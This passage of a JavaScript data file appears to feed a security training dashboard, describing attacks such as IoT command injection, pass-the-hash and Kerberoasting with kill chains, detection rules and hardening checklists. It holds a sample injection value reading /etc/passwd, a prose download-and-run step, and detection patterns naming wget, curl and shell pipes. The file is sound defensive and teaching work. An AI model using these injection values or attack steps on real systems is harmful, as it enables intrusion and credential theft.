      { id: "imitm_1", title: "Mandate MQTTS & TLS 1.3", tier: "IoT Protocol", desc: "Enforce TLS encryption on all broker connections (port 8883 for MQTTS) with mutual X.509 certificate authentication (mTLS)." },
      { id: "imitm_2", title: "Cryptographic Payload Signing", tier: "Application", desc: "Digitally sign JSON/CBOR telemetry messages with on-device hardware private keys before transmission." },
      { id: "imitm_3", title: "Zero Trust Network Segmentation", tier: "Network", desc: "Isolate IoT field sensors and cloud gateways on encrypted overlay networks (WireGuard / IPsec)." },
      { id: "imitm_4", title: "Detect Out-of-Bounds Sensor Values", tier: "Analytics", desc: "Implement statistical anomaly detection to alert on mathematically impossible physical sensor value shifts." }
    ]
  },

  {
    num: 64,
    id: "iot-command-injection",
    name: "IoT Command Injection",
    shortName: "IoT Command Injection",
    moduleGroup: "iot",
    module: "IoT Attacks",
    category: "iot",
    severity: "critical",
    cvss: "9.8",
    mitre: "T1059, CWE-78",
    primaryTargets: "Embedded Web Consoles, IP Camera Management APIs, Router CGI Scripts",
    threatActors: "Botnet Operators, Ransomware Cartels, Nation-State Actors",
    summary: "IoT Command Injection exploits severe input sanitization flaws inside embedded web interfaces, diagnostic ping tools, and CGI scripts (written in C, shell, or PHP) running on IoT devices. By appending shell metacharacters (such as ';', '&&', '|', or backticks) to form inputs or API parameters, attackers execute arbitrary Linux shell commands directly inside the device's underlying busybox interpreter with root privileges.",
    killChain: [
      {
        step: 1,
        title: "Diagnostic Parameter Identification",
        mitre: "T1190",
        desc: "Discovering embedded web forms that invoke system commands: e.g. ping, traceroute, or firmware reboot endpoints."
      },
      {
        step: 2,
        title: "Metacharacter Shell Breakout",
        mitre: "T1059",
        desc: "Injecting command delimiters: e.g. ping?ip=127.0.0.1;cat /etc/passwd into the input field."
      },
      {
        step: 3,
        title: "Root Shell Execution & Bot Deployment",
        mitre: "T1059.004",
        desc: "Executing wget or tftp to download malware binaries into /tmp, chmod +x, and launching persistent background daemon."
      }
    ],
    telemetry: {
      sources: [
        "IoT Web Server Access Logs (URI parameters containing shell characters: |, ;, &&, %26%26)",
        "IoT Gateway WAF Inspection Logs",
        "Device Process Audit (Unexpected child shells spawned from httpd/lighttpd)"
      ],
      anomalies: [
        "HTTP requests containing Linux shell commands (cat, rm, wget, curl, chmod) in query strings",
        "Embedded web daemon spawning /bin/sh or /bin/busybox child processes",
        "Spike in outbound network connections to unknown IP addresses from the web server process"
      ]
    },
    rules: {
      sigma: `title: IoT Embedded Web Server Command Injection Attempt
id: 5f6a7b8c-9d0e-1f2a-3b4c-5d6e7f8a9b0c
status: production
description: Detects shell command injection delimiters and busybox binaries in IoT web requests.
logsource:
    category: webserver
detection:
    selection:
        cs-uri-query|contains:
            - ';wget'
            - ';curl'
            - '|sh'
            - '&&cat'
            - '%3Bcat'
            - '%7Csh'
    condition: selection
level: critical
tags:
    - attack.execution
    - attack.t1059`,
      splunk: `index=iot_waf uri="*;*" OR uri="*|*" OR uri="*%3B*" OR uri="*%7C*"
| search uri="*wget*" OR uri="*sh*" OR uri="*chmod*"
| eval Alert="CRITICAL: Shell Command Injection Attempt on Embedded Web Server"
| table _time, client_ip, uri, Alert`,
      suricata: `alert http $EXTERNAL_NET any -> $HOME_NET any (
    msg:"SEC-ALERT IoT CGI Shell Command Injection Attempt";
    flow:to_server,established;
    http.uri; content:";"; content:"wget"; distance:0;
    classtype:web-application-attack;
    sid:1000064;
    rev:1;
)`,
      sysmon: `# Inspect web process tree on Linux device:
ps aux | grep -iE "(httpd|lighttpd|boa|sh)"`
    },
    defenseChecklist: [
      { id: "icmd_1", title: "Eliminate System Shell Calls", tier: "Firmware Development", desc: "Refactor embedded C/C++ CGI handlers to use secure execve() APIs with parameterized arguments instead of system() or popen()." },
      { id: "icmd_2", title: "Strict Input Validation & Whitelisting", tier: "Application", desc: "Enforce strict IP address and hostname regex validation on all diagnostic web form fields." },
      { id: "icmd_3", title: "Deploy IoT-Aware Web Application Firewall", tier: "Perimeter", desc: "Filter incoming traffic to embedded devices with a WAF ruleset that strips shell metacharacters." },
      { id: "icmd_4", title: "Non-Root Web Daemon Execution", tier: "OS Hardening", desc: "Configure web servers (lighttpd, nginx) to run under a restricted non-root service account with no write permissions to /tmp." }
    ]
  },
  // =========================================================================
  // MODULE 6: OPERATING SYSTEM SECURITY - WINDOWS ATTACKS (65 - 69)
  // =========================================================================
  {
    num: 65,
    id: "null-session-attack",
    name: "Windows Null Session Attack (SMB/RPC Anonymous Enumeration)",
    shortName: "Null Session Attack",
    moduleGroup: "windows",
    module: "Module 6: Windows Security Attacks",
    category: "windows",
    severity: "high",
    cvss: "7.5",
    mitre: "T1078.001, T1087.002, T1136",
    primaryTargets: "Windows Active Directory Domain Controllers, SMB File Shares, Port 445 / 139",
    threatActors: "APT29 (Cozy Bear), FIN7, Legacy Automated Worms",
    summary: "A Null Session Attack exploits legacy SMBv1/CIFS session establishment weaknesses where an attacker establishes an unauthenticated, anonymous connection (empty username and password) to the IPC$ share over port 445 or 139. Through this anonymous session, the attacker interacts with named pipes like SAMR and LSARPC to enumerate domain user accounts, security identifiers (SIDs), password policies, group memberships, and active network shares.",
    killChain: [
      {
        step: 1,
        title: "Initial Port & Protocol Probing",
        mitre: "T1595.002",
        desc: "Scanning target network subnet for exposed TCP ports 445 (SMB) and 139 (NetBIOS Session Service) to locate unhardened Windows domain hosts."
      },
      {
        step: 2,
        title: "Anonymous IPC$ Session Binding",
        mitre: "T1078.001",
        desc: "Dispatching an SMB Session Setup AndX request with null credentials (username: \"\", password: \"\") requesting access to the IPC$ administrative share."
      },
      {
        step: 3,
        title: "Named Pipe Interrogation (SAMR & LSARPC)",
        mitre: "T1021.002",
        desc: "Binding to MSRPC named pipes (\\pipe\\samr and \\pipe\\lsarpc) across the established null session without encountering authentication rejection."
      },
      {
        step: 4,
        title: "Active Directory & Security Identifier (SID) Enumeration",
        mitre: "T1087.002",
        desc: "Querying domain account SIDs through SamrQueryDisplayInformation and LsarLookupNames to reconstruct the complete user directory."
      },
      {
        step: 5,
        title: "Password Policy & Trust Relationship Harvesting",
        mitre: "T1201",
        desc: "Extracting lockout thresholds, minimum password length requirements, domain trust paths, and local group definitions."
      },
      {
        step: 6,
        title: "Targeted Password Spraying & Exploitation Handoff",
        mitre: "T1110.003",
        desc: "Utilizing the harvested user list and lockout policy to execute precision password spray attacks without triggering account lockouts."
      }
    ],
    telemetry: {
      sources: [
        "Windows Security Event Logs (Event ID 4624 Logon Type 3 with ANONYMOUS LOGON)",
        "SMB Server Operational Logs (Event ID 5140 Network Share Access on IPC$)",
        "Network Zeek/Bro Logs (SMB session negotiation with empty security blob)",
        "Sysmon for Windows (Event ID 3 Network Connection on port 445)"
      ],
      anomalies: [
        "Multiple SMB Session Setup requests with Logon Type 3 and SubjectUserName 'ANONYMOUS LOGON'",
        "High volume of RPC bind requests to SAMR and LSARPC UUIDs over IPC$ from non-domain IP addresses",
        "Rapid sequential queries to user rid cycling within a single 60-second window"
      ]
    },
    rules: {
      sigma: `title: Windows Anonymous SMB Null Session Connection
id: 3c1a8e74-29d5-41b9-8e42-7cf30a519801
status: stable
description: Detects an unauthenticated SMB session established with ANONYMOUS LOGON targeting the IPC$ share.
author: SOC Detection Engineering
logsource:
    product: windows
    service: security
detection:
    selection:
        EventID: 4624
        LogonType: 3
        TargetUserName: 'ANONYMOUS LOGON'
    share_access:
        EventID: 5140
        ShareName: '*\\\\IPC$'
    condition: selection or share_access
fields:
    - TargetUserName
    - IpAddress
    - WorkstationName
level: high
tags:
    - attack.discovery
    - attack.t1087.002
    - attack.initial_access
    - attack.t1078.001`,
      splunk: `index=windows_security (EventCode=4624 Logon_Type=3 TargetUserName="ANONYMOUS LOGON") OR (EventCode=5140 ShareName="*IPC$")
| stats count, values(ShareName) as Shares, values(TargetUserName) as Accounts by src_ip, dest_ip
| where count > 5
| eval Alert="CRITICAL: Windows SMB Null Session Enumeration Detected"
| table _time, src_ip, dest_ip, Accounts, Shares, count, Alert`,
      suricata: `alert smb $EXTERNAL_NET any -> $HOME_NET [139,445] (
    msg:"SEC-ALERT Inbound SMB Null Session IPC$ Access Attempt";
    flow:to_server,established;
    content:"IPC$"; nocase;
    metadata:mitre_technique T1078.001;
    classtype:attempted-recon;
    sid:1000065;
    rev:1;
)`,
      sysmon: `# Verify RestrictAnonymous registry setting via PowerShell:
Get-ItemProperty -Path "HKLM:\\SYSTEM\\CurrentControlSet\\Control\\Lsa" -Name "RestrictAnonymous"`
    },
    defenseChecklist: [
      { id: "null_1", title: "Enforce RestrictAnonymous Registry Policy", tier: "OS Hardening", desc: "Set HKLM\\SYSTEM\\CurrentControlSet\\Control\\Lsa\\RestrictAnonymous to 2 (do not allow anonymous enumeration of SAM accounts and shares)." },
      { id: "null_2", title: "Disable SMBv1 & Require SMB Signing", tier: "Network Security", desc: "Completely remove SMBv1 protocol drivers and enforce SMB Signing and Encryption on all domain servers." },
      { id: "null_3", title: "Restrict Lateral SMB Traffic", tier: "Micro-Segmentation", desc: "Block inbound ports 139 and 445 between internal workstation segments using host-based firewalls." },
      { id: "null_4", title: "Audit Anonymous Share Access GPO", tier: "Active Directory", desc: "Enable 'Network access: Restrict anonymous access to Named Pipes and Shares' in Domain Group Policy." }
    ]
  },

  {
    num: 66,
    id: "missing-patch-exploitation",
    name: "Windows Missing Patch Exploitation (Kernel & Service Remote Exploitation)",
    shortName: "Missing Patch Exploitation",
    moduleGroup: "windows",
    module: "Module 6: Windows Security Attacks",
    category: "windows",
    severity: "critical",
    cvss: "9.8",
    mitre: "T1190, T1068, T1203",
    primaryTargets: "Windows Kernel (ntoskrnl.exe), SMBv3 (srv2.sys), RPC Runtime, Spooler Service (spoolsv.exe)",
    threatActors: "Lazarus Group, LockBit Gang, APT28, FIN11",
    summary: "Missing Patch Exploitation involves adversaries auditing enterprise Windows systems to identify critical Common Vulnerabilities and Exposures (CVEs) where security patches issued by Microsoft (Patch Tuesday KBs) have not been applied. Attackers leverage weaponized public or proprietary exploitsâ€”such as MS17-010 (EternalBlue), CVE-2020-0796 (SMBGhost), or CVE-2021-34527 (PrintNightmare)â€”to gain immediate remote unauthenticated code execution in Ring-0 kernel or SYSTEM contexts.",
    killChain: [
      {
        step: 1,
        title: "Build Number & Patch Footprinting",
        mitre: "T1592.002",
        desc: "Interrogating exposed Windows services via NTLM challenge negotiation and SMB dialect exchanges to extract exact Windows build and revision numbers."
      },
      {
        step: 2,
        title: "CVE Vulnerability Differential Analysis",
        mitre: "T1588.005",
        desc: "Comparing the target's operating system build against Microsoft Security Update Guide bulletin databases to identify missing critical KBs."
      },
      {
        step: 3,
        title: "Exploit Weaponization & Memory Grooming",
        mitre: "T1203",
        desc: "Preparing exploit payload tailored to target memory architecture (Non-Paged Pool grooming, BigPool allocations, or heap spray)."
      },
      {
        step: 4,
        title: "Vulnerability Trigger & Pool Corruption",
        mitre: "T1068",
        desc: "Dispatching crafted malformed network packets (e.g. compressed SMB2 packet or crafted RPC bind) triggering buffer overflow or integer truncation."
      },
      {
        step: 5,
        title: "Kernel Token Stealing (SYSTEM Elevation)",
        mitre: "T1134.001",
        desc: "Overwriting active thread token pointers in kernel memory with the Token pointer of the System process (PID 4) to elevate to NT AUTHORITY\\SYSTEM."
      },
      {
        step: 6,
        title: "Interactive System Shell Spawn & C2 Ingress",
        mitre: "T1059.003",
        desc: "Spawning an elevated child process under svchost.exe or srv2.sys and initiating outbound encrypted beaconing to attacker infrastructure."
      }
    ],
    telemetry: {
      sources: [
        "Sysmon for Windows (Event ID 1 Process Creation: svchost.exe or spoolsv.exe spawning cmd.exe or powershell.exe)",
        "Windows System Event Log (Event ID 1000 Application Error crash, Event ID 7045 New Service Installed)",
        "Windows Defender Antivirus Event ID 1116 (Malware/Exploit detected)",
        "Network Zeek Logs (Unusual SMB compression headers or malformed RPC calls)"
      ],
      anomalies: [
        "Windows core system services (spoolsv.exe, services.exe, svchost.exe) spawning command interpreters (cmd.exe, powershell.exe, whoami.exe)",
        "Repeated BugCheck / BSOD events indicating failed kernel pool exploitation attempts",
        "Sudden injection into system processes originating from kernel memory space"
      ]
    },
    rules: {
      sigma: `title: Suspicious Child Process Spawned by Windows System Service
id: 5b2e9c18-47d3-4a81-9b16-8f3e2a0c7166
status: stable
description: Detects command interpreter execution spawned directly by core Windows services, indicating missing patch exploitation.
author: SOC Detection Engineering
logsource:
    category: process_creation
    product: windows
detection:
    selection:
        ParentImage|endswith:
            - '\\spoolsv.exe'
            - '\\services.exe'
            - '\\svchost.exe'
        Image|endswith:
            - '\\cmd.exe'
            - '\\powershell.exe'
            - '\\pwsh.exe'
            - '\\whoami.exe'
    condition: selection
fields:
    - ParentImage
    - Image
    - CommandLine
    - User
level: critical
tags:
    - attack.execution
    - attack.t1059.001
    - attack.privilege_escalation
    - attack.t1068`,
      splunk: `index=sysmon EventCode=1 (ParentImage="*\\spoolsv.exe" OR ParentImage="*\\services.exe") (Image="*\\cmd.exe" OR Image="*\\powershell.exe" OR Image="*\\whoami.exe")
| eval Alert="CRITICAL: Exploitation Indicator - System Service Spawning Interactive Shell"
| table _time, host, ParentImage, Image, CommandLine, User, Alert`,
      suricata: `alert tcp $EXTERNAL_NET any -> $HOME_NET 445 (
    msg:"SEC-ALERT Inbound Exploitation Attempt Matching SMB Remote Code Execution";
    flow:to_server,established;
    content:"|FC E8|"; depth:2;
    classtype:attempted-admin;
    sid:1000066;
    rev:1;
)`,
      sysmon: `# Query missing Windows Updates and Hotfixes using PowerShell:
Get-HotFix | Sort-Object InstalledOn -Descending | Select-Object -First 10 HotFixID, Description, InstalledOn`
    },
    defenseChecklist: [
      { id: "patch_1", title: "Automated Continuous Patch Lifecycle", tier: "Vulnerability Management", desc: "Deploy automated patching (Microsoft Intune, SCCM, WSUS) with strict 72-hour SLAs for critical CVSS 9.0+ bulletins." },
      { id: "patch_2", title: "Endpoint Vulnerability Scanning", tier: "SecOps", desc: "Run authenticated vulnerability scans weekly across all domain endpoints to identify unpatched hotfixes and EOL software." },
      { id: "patch_3", title: "Network Microsegmentation & Firewalls", tier: "Perimeter", desc: "Block inbound port 445 and RPC dynamic ports from the internet and between unrelated internal security zones." },
      { id: "patch_4", title: "Host Intrusion Prevention & Exploit Guard", tier: "EDR", desc: "Enable Windows Defender Exploit Guard and Attack Surface Reduction (ASR) rules preventing child process spawning." }
    ]
  },

  {
    num: 67,
    id: "windows-privilege-escalation",
    name: "Windows Local Privilege Escalation (Token Impersonation & Service Misconfigurations)",
    shortName: "Windows Priv Escalation",
    moduleGroup: "windows",
    module: "Module 6: Windows Security Attacks",
    category: "windows",
    severity: "high",
    cvss: "8.8",
    mitre: "T1068, T1134, T1574.009, T1548.002",
    primaryTargets: "Windows Access Tokens, SeImpersonatePrivilege, AlwaysInstallElevated GPO, Unquoted Service Paths",
    threatActors: "APT41, Black Basta, Emotet, Storm-0501",
    summary: "Windows Privilege Escalation allows an adversary who has gained low-privileged local access (such as standard domain user or IIS service account) to elevate execution to NT AUTHORITY\\SYSTEM or Local Administrator. Common Windows vectors include abusing token impersonation privileges (SeImpersonatePrivilege via PrintSpoofer / SweetPotato), hijacking unquoted service paths with spaces in directory paths, exploiting AlwaysInstallElevated Windows Installer policies, or bypassing UAC via registry auto-elevation.",
    killChain: [
      {
        step: 1,
        title: "Local Privileges & Group Audit",
        mitre: "T1069.001",
        desc: "Executing privilege audits (whoami /priv, whoami /groups) to identify high-value tokens like SeImpersonatePrivilege, SeAssignPrimaryToken, or SeBackupPrivilege."
      },
      {
        step: 2,
        title: "Service & Registry Weakness Probing",
        mitre: "T1574.009",
        desc: "Auditing Windows service binaries for unquoted paths with write access (wmic service get name,pathname) and querying AlwaysInstallElevated registry keys."
      },
      {
        step: 3,
        title: "Named Pipe Impersonation Staging",
        mitre: "T1134.001",
        desc: "Creating a controlled local Named Pipe and coercing a high-privileged system service (e.g. Spooler or RPC) to authenticate against the pipe."
      },
      {
        step: 4,
        title: "ImpersonateLoggedOnUser API Execution",
        mitre: "T1134",
        desc: "Calling the Windows ImpersonateNamedPipeClient() or DuplicateTokenEx() API to adopt the SYSTEM security context of the incoming service client."
      },
      {
        step: 5,
        title: "SYSTEM Process Ingress (cmd / powershell)",
        mitre: "T1059.003",
        desc: "Using the duplicated SYSTEM token with CreateProcessWithTokenW() to launch an interactive shell operating at High or System Integrity level."
      },
      {
        step: 6,
        title: "Token Persistence & Security Account Modification",
        mitre: "T1136.001",
        desc: "Creating a hidden administrative user account or dumping the local SAM database for long-term administrative retention."
      }
    ],
    telemetry: {
      sources: [
        "Windows Security Event Logs (Event ID 4672 Special privileges assigned, Event ID 4673 Privileged Service Called)",
        "Sysmon for Windows (Event ID 1 Process Creation with IntegrityLevel=System from Low/Medium parent)",
        "Sysmon Event ID 10 (ProcessAccess to winlogon.exe or lsass.exe)",
        "Windows Registry Auditing (AlwaysInstallElevated modifications)"
      ],
      anomalies: [
        "Low-privileged service accounts (iis apppool, local service, network service) spawning interactive SYSTEM cmd.exe",
        "Sudden assignment of SeImpersonatePrivilege or SeDebugPrivilege to unexpected processes",
        "Named Pipe connections established to non-standard, random GUID pipe names"
      ]
    },
    rules: {
      sigma: `title: Windows Token Impersonation Privilege Escalation
id: 9a3e1b72-58f4-49c0-9d21-4b7e3f8a0067
status: stable
description: Detects process creation with SYSTEM integrity spawned by service accounts commonly abused in token impersonation (Potato) attacks.
author: SOC Detection Engineering
logsource:
    category: process_creation
    product: windows
detection:
    selection_parent:
        ParentUser|contains:
            - 'LOCAL SERVICE'
            - 'NETWORK SERVICE'
            - 'IIS APPPOOL'
    selection_image:
        Image|endswith:
            - '\\cmd.exe'
            - '\\powershell.exe'
    selection_user:
        User|contains: 'SYSTEM'
    condition: selection_parent and selection_image and selection_user
fields:
    - ParentImage
    - Image
    - CommandLine
    - User
level: high
tags:
    - attack.privilege_escalation
    - attack.t1134.001`,
      splunk: `index=sysmon EventCode=1 (ParentUser="*LOCAL SERVICE*" OR ParentUser="*NETWORK SERVICE*" OR ParentUser="*IIS APPPOOL*") User="*SYSTEM*" (Image="*\\cmd.exe" OR Image="*\\powershell.exe")
| eval Alert="HIGH: Potato-Style Token Impersonation Privilege Escalation Detected"
| table _time, host, ParentImage, ParentUser, Image, CommandLine, User, Alert`,
      suricata: `# Host-level rule via audit / Sysmon:
alert tcp $HOME_NET any -> $HOME_NET any (
    msg:"SEC-ALERT Internal Named Pipe Impersonation Traffic Anomaly";
    flow:to_server,established;
    content:"\\\\pipe\\\\";
    classtype:bad-unknown;
    sid:1000067;
    rev:1;
)`,
      sysmon: `# Inspect current user privileges for sensitive impersonation rights:
whoami /priv | Select-String -Pattern "SeImpersonatePrivilege|SeAssignPrimaryToken|SeDebugPrivilege"`
    },
    defenseChecklist: [
      { id: "winpe_1", title: "Strip SeImpersonatePrivilege from Service Accounts", tier: "OS Hardening", desc: "Configure service accounts (IIS, SQL, scheduled tasks) to operate without SeImpersonatePrivilege where not strictly required." },
      { id: "winpe_2", title: "Audit & Fix Unquoted Service Paths", tier: "Configuration Audit", desc: "Audit all service binary paths with spaces and wrap them in quotation marks to prevent DLL/binary hijacking." },
      { id: "winpe_3", title: "Disable AlwaysInstallElevated Policy", tier: "Group Policy", desc: "Ensure HKLM and HKCU 'AlwaysInstallElevated' GPO keys are explicitly set to 0 across all domain systems." },
      { id: "winpe_4", title: "Deploy LAPS (Local Admin Password Solution)", tier: "Active Directory", desc: "Randomize all local administrator passwords using Windows LAPS to prevent lateral escalation across fleet." }
    ]
  },

  {
    num: 68,
    id: "pass-the-hash",
    name: "Windows Pass-the-Hash Attack (NTLM Credential Replay & Lateral Movement)",
    shortName: "Pass-the-Hash (PtH)",
    moduleGroup: "windows",
    module: "Module 6: Windows Security Attacks",
    category: "windows",
    severity: "high",
    cvss: "8.5",
    mitre: "T1550.002, T1003.001, T1021.002",
    primaryTargets: "LSASS Process Memory, NTLM Authentication Handshakes, Windows Admin Shares (C$, ADMIN$)",
    threatActors: "APT28 (Fancy Bear), Sandworm, Scattered Spider, FIN6",
    summary: "Pass-the-Hash (PtH) is an adversarial lateral movement technique where an attacker extracts an NTLM password hash from the local SAM database or LSASS process memory of a compromised host. Rather than attempting to crack the hash into plaintext, the attacker provides the raw NTLM hash directly to the NTLM authentication provider, authenticating to remote domain servers over SMB (ports 445/139), WMI, or WinRM without ever knowing the user's actual password.",
    killChain: [
      {
        step: 1,
        title: "LSASS Process Memory Access",
        mitre: "T1003.001",
        desc: "Acquiring PROCESS_VM_READ and PROCESS_QUERY_INFORMATION rights to the Local Security Authority Subsystem Service (lsass.exe)."
      },
      {
        step: 2,
        title: "NTLM Hash Extraction & Parsing",
        mitre: "T1003",
        desc: "Parsing the authentication packages within memory to carve out 32-character hexadecimal NTLM password hashes for local and domain administrator accounts."
      },
      {
        step: 3,
        title: "Target Scoping & Local Admin Mapping",
        mitre: "T1018",
        desc: "Scanning adjacent domain systems to verify which workstations and member servers share the identical local administrator account and password hash."
      },
      {
        step: 4,
        title: "NTLM Type-3 Response Crafting (Hash Injection)",
        mitre: "T1550.002",
        desc: "Intercepting the NTLM Challenge-Response handshake and computing the NTLM response using the captured hash without user plaintext interaction."
      },
      {
        step: 5,
        title: "Remote Service Execution (SMB/WMI/WinRM)",
        mitre: "T1021.002",
        desc: "Connecting to remote administrative share \\\\target\\ADMIN$ and creating a remote Windows service or WMI process executing attacker payloads."
      },
      {
        step: 6,
        title: "Domain Infrastructure Proliferation",
        mitre: "T1080",
        desc: "Harvesting new credentials from the newly compromised host to leapfrog across domain tiers toward Active Directory Domain Controllers."
      }
    ],
    telemetry: {
      sources: [
        "Windows Security Event Logs (Event ID 4624 Logon Type 3, Logon Process: Advapi or NtLmSsp with Key Length 0)",
        "Windows Event ID 4672 (Special privileges assigned to logon session)",
        "Sysmon Event ID 10 (ProcessAccess requesting access to lsass.exe)",
        "Zeek / Suricata (NTLM authentication session over SMB with missing Kerberos negotiation)"
      ],
      anomalies: [
        "Workstation-to-workstation SMB connections using NTLM instead of Kerberos",
        "Event 4624 Logon Type 3 authentications where Authentication Package is NTLM and Package Name is NTLM V1/V2 with KeyLength=0",
        "Sudden burst of administrative share access (ADMIN$, C$) from non-IT management IP addresses"
      ]
    },
    rules: {
      sigma: `title: Potential Pass-the-Hash Network Logon Activity
id: 8c4f1d39-62a7-4b81-9f30-7e1d4c2a0068
status: stable
description: Detects network logons (Type 3) using NTLM authentication package with empty key length characteristic of Pass-the-Hash tools.
author: SOC Detection Engineering
logsource:
    product: windows
    service: security
detection:
    selection:
        EventID: 4624
        LogonType: 3
        AuthenticationPackageName: 'NTLM'
        KeyLength: 0
    filter_dc:
        TargetUserName|endswith: '$'
    condition: selection and not filter_dc
fields:
    - IpAddress
    - TargetUserName
    - WorkstationName
    - AuthenticationPackageName
level: high
tags:
    - attack.lateral_movement
    - attack.t1550.002
    - attack.credential_access
    - attack.t1003.001`,
      splunk: `index=windows_security EventCode=4624 Logon_Type=3 AuthenticationPackageName="NTLM" KeyLength=0 NOT TargetUserName="*$"
| stats count, values(dest_ip) as Targets, values(WorkstationName) as SourceHosts by src_ip, TargetUserName
| where count > 3
| eval Alert="HIGH: Pass-the-Hash NTLM Replay Activity Detected"
| table _time, src_ip, TargetUserName, SourceHosts, Targets, count, Alert`,
      suricata: `alert smb $HOME_NET any -> $HOME_NET 445 (
    msg:"SEC-ALERT Internal Pass-the-Hash Lateral Movement SMB Session";
    flow:to_server,established;
    content:"NTLMSSP";
    content:"ADMIN$"; nocase;
    classtype:successful-admin;
    sid:1000068;
    rev:1;
)`,
      sysmon: `# Inspect LSASS protection status via PowerShell:
Get-ItemProperty -Path "HKLM:\\SYSTEM\\CurrentControlSet\\Control\\Lsa" -Name "RunAsPPL"`
    },
    defenseChecklist: [
      { id: "pth_1", title: "Enable Windows Defender Credential Guard", tier: "Endpoint Virtualization", desc: "Deploy VBS (Virtualization-Based Security) to isolate LSASS memory inside a secure virtual container inaccessible to Ring-0." },
      { id: "pth_2", title: "Restrict NTLM Authentication", tier: "Domain Policy", desc: "Audit and restrict NTLM usage across the domain using 'Network Security: Restrict NTLM: Incoming NTLM Traffic' GPO." },
      { id: "pth_3", title: "Enforce Tiered Administration Architecture", tier: "Architecture", desc: "Prohibit Tier 0 (Domain Admin) and Tier 1 accounts from logging onto Tier 2 workstations to prevent hash harvesting." },
      { id: "pth_4", title: "Deploy Protected Users Security Group", tier: "Active Directory", desc: "Add sensitive administrative accounts to Active Directory Protected Users group to disable NTLM hash caching." }
    ]
  },

  {
    num: 69,
    id: "kerberoasting",
    name: "Active Directory Kerberoasting Attack (Service Ticket Extraction & Offline Cracking)",
    shortName: "Kerberoasting",
    moduleGroup: "windows",
    module: "Module 6: Windows Security Attacks",
    category: "windows",
    severity: "high",
    cvss: "8.2",
    mitre: "T1558.003, T1003, T1078",
    primaryTargets: "Active Directory Domain Controllers (KDC), Service Principal Names (SPNs), MSSQL / IIS Service Accounts",
    threatActors: "APT29, Vice Society, BlackCat / ALPHV, FIN8",
    summary: "Kerberoasting is a post-compromise Active Directory attack that allows any authenticated domain user to request encrypted Kerberos Ticket Granting Service (TGS) tickets for service accounts registered with Service Principal Names (SPNs). Because the service ticket is encrypted with the password hash of the targeted service account, the attacker extracts the ticket from memory and executes offline dictionary or brute-force cracking to discover the plaintext service account credentials.",
    killChain: [
      {
        step: 1,
        title: "Domain Foothold & LDAP SPN Discovery",
        mitre: "T1087.002",
        desc: "Querying Active Directory LDAP catalog for user accounts possessing non-empty servicePrincipalName attributes (e.g. MSSQLSvc, HTTP, CIFS)."
      },
      {
        step: 2,
        title: "High-Privilege Service Account Filtering",
        mitre: "T1069.002",
        desc: "Filtering discovered SPN accounts for elevated group memberships (Domain Admins, Enterprise Admins, Server Operators) with legacy password policies."
      },
      {
        step: 3,
        title: "TGS Ticket Request Dispatch (KDC)",
        mitre: "T1558.003",
        desc: "Dispatching standard Kerberos TGS-REQ packets to the Domain Controller KDC requesting service tickets for the target SPNs."
      },
      {
        step: 4,
        title: "TGS-REP Response Extraction & Downgrade",
        mitre: "T1558.003",
        desc: "Capturing the returned TGS-REP packets containing the service ticket encrypted with RC4_HMAC (Ticket Encryption Type 0x17) or AES-256."
      },
      {
        step: 5,
        title: "Offline High-Speed Hash Cracking (Hashcat)",
        mitre: "T1110.002",
        desc: "Extracting ticket ciphertext into Hashcat format (mode 13100) and performing GPU-accelerated dictionary attacks with password rulesets."
      },
      {
        step: 6,
        title: "Plaintext Credential Login & Domain Elevation",
        mitre: "T1078.002",
        desc: "Using the cracked cleartext service password to authenticate directly to production databases, domain servers, and sensitive infrastructure."
      }
    ],
    telemetry: {
      sources: [
        "Windows Security Event Log on Domain Controllers (Event ID 4769 A Kerberos service ticket was requested)",
        "Windows Event ID 4768 (A Kerberos authentication ticket TGT was requested)",
        "Active Directory LDAP Audit Logs (Event ID 1644 Directory Service Search Query)",
        "Network Zeek Logs (Kerberos TGS-REQ packet volume per workstation)"
      ],
      anomalies: [
        "Single user workstation requesting multiple TGS tickets for distinct SPNs within seconds",
        "Event ID 4769 requests with Ticket Encryption Type 0x17 (RC4_HMAC) when AES is standard in domain",
        "Non-administrative domain account querying LDAP for (servicePrincipalName=*) across the entire directory"
      ]
    },
    rules: {
      sigma: `title: Anomalous Kerberos Service Ticket Request (Kerberoasting)
id: 4e2c8a19-73b5-4f01-9a18-5c3e2f1a0069
status: stable
description: Detects multiple Kerberos TGS ticket requests with RC4 encryption type characteristic of Kerberoasting campaigns.
author: SOC Detection Engineering
logsource:
    product: windows
    service: security
detection:
    selection:
        EventID: 4769
        TicketOptions: '0x40810000'
        TicketEncryptionType: '0x17'
    filter_krbtgt:
        ServiceName: 'krbtgt'
    condition: selection and not filter_krbtgt
fields:
    - TargetUserName
    - ServiceName
    - IpAddress
    - TicketEncryptionType
level: high
tags:
    - attack.credential_access
    - attack.t1558.003`,
      splunk: `index=windows_security EventCode=4769 TicketEncryptionType="0x17" NOT ServiceName="*$" NOT ServiceName="krbtgt"
| stats count, values(ServiceName) as RequestedServices by TargetUserName, IpAddress
| where count > 3
| eval Alert="CRITICAL: Potential Kerberoasting Activity - High Volume of RC4 TGS Requests"
| table _time, TargetUserName, IpAddress, RequestedServices, count, Alert`,
      suricata: `alert tcp $HOME_NET any -> $HOME_NET 88 (
    msg:"SEC-ALERT High Volume of Kerberos TGS Requests from Single Host";
    flow:to_server,established;
    threshold: type both, track by_src, count 8, seconds 10;
    classtype:attempted-recon;
    sid:1000069;
    rev:1;
)`,
      sysmon: `# Query domain user accounts with Service Principal Names via PowerShell:
Get-ADUser -Filter {ServicePrincipalName -like "*"} -Properties ServicePrincipalName | Select-Object SamAccountName, ServicePrincipalName`
    },
    defenseChecklist: [
      { id: "kerb_1", title: "Deploy Group Managed Service Accounts (gMSA)", tier: "Active Directory", desc: "Migrate all service accounts to gMSAs featuring 128-character automatically rotated passwords immune to offline cracking." },
      { id: "kerb_2", title: "Enforce AES-256 for Kerberos Encryption", tier: "Domain Hardening", desc: "Configure Active Directory user account properties to require AES-128 and AES-256 encryption, deprecating RC4_HMAC." },
      { id: "kerb_3", title: "Implement 25+ Character Passwords for Service Accounts", tier: "Password Policy", desc: "Enforce minimum 25-character complex passphrases for any remaining standard service accounts possessing SPNs." },
      { id: "kerb_4", title: "SIEM Anomaly Detection on Event ID 4769", tier: "SOC Monitoring", desc: "Create correlation alerts for users requesting more than 3 distinct service tickets within a rolling 5-minute window." }
    ]
  },

  // =========================================================================
  // MODULE 6: OPERATING SYSTEM SECURITY - LINUX ATTACKS (70 - 74)
  // =========================================================================
  {
    num: 70,
    id: "linux-nfs-attack",
    name: "Linux Network File System (NFS) Attack (no_root_squash Exploitation & SUID Injection)",
